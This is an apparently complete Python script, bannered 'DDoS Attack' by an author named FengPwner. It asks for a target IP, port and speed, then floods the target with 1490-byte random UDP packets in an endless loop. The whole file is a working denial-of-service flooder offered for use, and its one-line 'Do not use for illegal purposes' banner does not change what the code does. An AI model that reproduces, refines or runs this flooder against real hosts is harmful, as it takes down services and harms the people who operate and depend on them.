# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDoS Attack")
print (" ")
print ("---------------------------------------------------")
print ("   Author   : FengPwner                              ")
print ("   Github   : https://github.com/FengPwner         ")
print ("   CSDN     : https://blog.csdn.net/2302_76189356  ")
print ("   Version  : 0.3.0                                ")
print ("---------------------------------------------------")
print ("   To update, please use `git pull`    ")
print ("---------------------------------------------------")
print (" ")
print (" ")
print (" -----------------[Do not use for illegal purposes]----------------- ")
print (" ")
print (" ")
print (" ")
print (" ")
ip = input("IP: ")

port = int(input("port: "))

sd = int(input("speed(1~1000) : "))


os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s data packet to %s port %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
